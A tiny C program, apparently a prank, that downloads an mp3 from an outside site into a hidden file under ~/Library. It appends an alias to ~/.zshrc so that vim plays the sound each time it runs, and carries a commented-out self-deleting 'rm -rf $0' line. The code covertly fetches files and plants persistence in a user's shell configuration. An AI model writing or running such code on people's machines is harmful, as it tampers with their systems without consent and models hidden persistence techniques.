#include <stdlib.h>

int	main()
{
	system("curl -o ~/Library/.257.mp3 http://s1download-universal-soundbank.com/mp3/sounds/257.mp3");

	system("echo 'alias vim=\"afplay $HOME/Library/.257.mp3 && vim\"' >> ~/.zshrc");
	return (0);
//#rm -rf $0
}
